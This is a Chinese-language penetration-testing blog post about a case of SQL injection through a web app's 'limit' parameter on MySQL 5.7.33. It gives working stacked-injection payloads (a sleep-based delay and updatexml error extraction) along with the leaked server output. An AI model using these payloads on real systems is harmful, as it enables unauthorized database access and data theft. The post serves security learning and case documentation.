# 005-渗透案例：记一次SQL注入：mysql-5.7-Limit注入



&lt;!--more--&gt;
今天遇到个案例，在`/queryxxxx?page=1&amp;limit=10&#39;&amp;DONATOR_ID=145539`中limit参数存在注入点。

通过单引号爆处SQL语句，如下：

```sql
java.sql.SQLException: sql injection violation, syntax error: unclosed str : 
SELECT  
	xxxx 
	FROM `mis_jkxx` WHERE DONATOR_ID = ?  AND CHECK_FLAG != 1
	ORDER BY CHECK_TIME desc
	limit  0 ,10&#39;
```

通过其他注入点得知数据库版本为 MySQL 5.7.33

mysql 5.7之后版本，limit注入不再支持procedure函数，利用该函数的报错注入不再适用。

即：

```sql
select * from test limit 0,1 procedure analyse(extractvalue(1, concat(0x1, user())),1);
```

不可用。

该语句存在Order by，也不适用 union select 联合查询，即：

```
select * from test limit 0,1 union select version();
```



最后解决办法：

**堆叠注入**

由于LIMIT 语句必须是 SELECT 语句的最后一条子句，因此可以尝试用分号（`;`)直接闭合前一句select语句，在后面插入恶意语句，达到SQL注入的效果。

延时-举例：

```
queryxxx?page=1&amp;limit=10;select&#43;sleep(5)--&#43;&amp;DONATOR_ID=145539
```

闭合limit后，成功触发
```sql
SELECT  xxx FROM
`mis_jkxx` WHERE DONATOR_ID = ?  AND CHECK_FLAG != 1
ORDER BY CHECK_TIME desc
limit  0 ,10; select&#43;sleep(5)--\r\n
```



举例-报错：

```sql
queryxxx?page=1&amp;limit=10;select&#43;(updatexml(1,concat(0x7e,(select&#43;version()),0x7e),1))
```

闭合limit后，成功触发

```sql
SELECT  xxx FROM
`mis_jkxx` WHERE DONATOR_ID = ?  AND CHECK_FLAG != 1
ORDER BY CHECK_TIME desc
limit  0 ,10; select&#43;(updatexml(1,concat(0x7e,(select&#43;version()),0x7e),1))\r\n
```

报错返回

```
Cause: java.sql.SQLException: XPATH syntax error: &#39;~5.7.33~&#39;\n; uncategorized SQLException for SQL []; SQL state [HY000]; error code [1105]; XPATH syntax error: &#39;~5.7.33~&#39;; nested exception is java.sql.SQLException: XPATH syntax error: &#39;~5.7.33~&#39;&#34;,
```



---

> 作者: Xavier  
> URL: http://localhost:1313/posts/005-case-sqli-mysql-limit/  

